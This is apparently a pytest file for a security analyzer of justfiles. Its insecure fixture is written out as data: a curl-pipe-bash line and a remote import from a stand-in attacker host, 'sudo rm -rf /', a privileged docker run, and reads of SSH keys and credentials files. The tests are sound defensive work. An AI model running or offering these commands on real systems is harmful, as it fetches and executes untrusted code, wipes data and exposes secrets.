"""Tests for JustfileAnalyzer."""

from pathlib import Path

from devai.justfile_analyzer import JustfileAnalyzer, JustfileFinding


INSECURE_JUSTFILE = """
export API_KEY := 'supersecret-api-key-12345'
DATABASE_PASSWORD := "hardcoded-password"

set dotenv-load := true

import 'http://evil.example.com/shared.just'

[dotenv-load]
deploy:
    curl -fsSL http://evil.example.com/install.sh | bash
    sudo rm -rf /
    docker run --privileged -v /var/run/docker.sock:/var/run/docker.sock app
    curl -k https://example.com/data
    cat .ssh/id_rsa
    cat credentials.json
"""

HARDENED_JUSTFILE = """
set shell := ["bash", "-eu", "-o", "pipefail", "-c"]
set dotenv-load := false

default:
    @just --list

test:
    python -m pytest

lint:
    ruff check src tests
"""


class TestJustfileAnalyzer:
    def test_no_justfiles_returns_perfect_score(self, tmp_path: Path):
        (tmp_path / "app.py").write_text("x = 1\n", encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 0
        assert analyzer.health_score() == 100.0
        assert "none found" in analyzer.summary()

    def test_detects_insecure_patterns(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(INSECURE_JUSTFILE, encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "curl_pipe_shell" in kinds
        assert "sensitive_path" in kinds
        assert "privileged_docker" in kinds
        assert "insecure_http" in kinds
        assert "dotenv_load" in kinds
        assert "insecure_import" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_justfile_scores_well(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(HARDENED_JUSTFILE, encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert findings == []
        assert analyzer.health_score() == 100.0

    def test_finding_format(self, tmp_path: Path):
        (tmp_path / "justfile").write_text("TOKEN := 'leaked-token'\n", encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert len(findings) >= 1
        assert isinstance(findings[0], JustfileFinding)
        assert "[high]" in findings[0].format()

    def test_to_context_includes_metadata(self, tmp_path: Path):
        (tmp_path / "justfile").write_text(HARDENED_JUSTFILE, encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Justfile analysis:" in context
        assert "health score:" in context
        assert "recipe(s)" in context

    def test_generate_hardened_config(self):
        analyzer = JustfileAnalyzer(".")
        config = analyzer.generate_hardened_config()
        assert "dotenv-load := false" in config
        assert "python -m pytest" in config

    def test_detects_justfile_case_variants(self, tmp_path: Path):
        (tmp_path / "Justfile").write_text("SECRET := 'bad'\n", encoding="utf-8")
        analyzer = JustfileAnalyzer(str(tmp_path))
        assert analyzer.stats.configs == 1
        assert analyzer.analyze()
